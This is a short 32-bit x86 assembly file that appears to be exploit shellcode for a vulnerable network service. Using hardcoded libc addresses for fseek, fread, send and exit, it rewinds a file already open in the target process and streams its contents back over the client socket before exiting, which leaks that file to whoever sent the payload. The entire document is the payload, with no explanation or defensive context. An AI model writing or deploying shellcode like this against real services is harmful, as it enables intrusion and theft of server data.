bits 32

LIBC_BASE equ 0x7F3F000
SEND equ (LIBC_BASE + 0x8C3D0)
FSEEK equ (LIBC_BASE + 0x9DAB0)
FREAD equ (LIBC_BASE + 0xAC370)
EXIT equ (LIBC_BASE + 0xD1190)
FILE equ 0x804E738

   jmp short tgt
   db 'AAAAAAAAAAAAAAAA'
tgt:
   pop eax
   pop esi   ; client sock
   xor eax, eax
   push eax
   push eax
   mov eax, FILE
   push dword [eax]
   mov eax,FSEEK
   call eax
   pop eax
   pop ecx
   pop ebx
   mov edi, esp
   push eax
   mov ch, 0xff
   push ecx
   push byte 1
   push edi
doread:
   mov eax,FREAD
   call eax
   test eax,eax
   jle done
   push ebx
   push eax
   push edi
   push esi
   mov eax,SEND
   call eax
   add esp, byte 16
   jmp doread
done:
   mov eax,EXIT ; exit
   call eax
